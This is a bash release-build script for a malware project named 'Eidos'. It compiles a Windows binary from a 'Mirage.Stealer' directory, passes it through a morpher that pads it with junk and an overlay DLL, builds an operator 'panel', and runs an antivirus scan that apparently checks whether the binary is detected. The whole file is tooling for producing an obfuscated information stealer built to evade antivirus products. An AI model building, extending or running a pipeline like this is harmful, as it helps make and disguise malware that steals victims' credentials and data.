#!/bin/bash
# Release build pipeline
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

echo "=== Eidos Release Build ==="

# 1. Build stealer
cd "$PROJECT_DIR/Mirage.Stealer"
zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall
cd "$PROJECT_DIR"

# 2. Morph the binary
python3 "$SCRIPT_DIR/morpher.py" \
    "Mirage.Stealer/zig-out/bin/Mirage.exe" \
    -o dist/Mirage.exe --junk 2048 --overlay MirageDecryptor.dll 2>/dev/null || {
    echo "[!] Morpher skipped (script not found) — copying binary directly"
    mkdir -p dist
    cp "Mirage.Stealer/zig-out/bin/Mirage.exe" dist/Mirage.exe
}

# 3. Build panel
cd "$PROJECT_DIR/Mirage.Panel"
go build -o "$PROJECT_DIR/dist/panel" ./cmd/panel 2>/dev/null || {
    echo "[!] Panel build skipped (not a Go build target)"
}
cd "$PROJECT_DIR"

# 4. AV scan
python3 "$SCRIPT_DIR/av_scan.py" dist/Mirage.exe 2>/dev/null || {
    echo "[!] AV scan skipped (VT_API_KEY not set or script error)"
}

echo "=== Build Complete ==="
echo "Output: dist/"
echo "Morphed binary: dist/Mirage.exe"
echo "Panel: dist/panel"
ls -lh dist/ 2>/dev/null || echo "(empty dist/)"
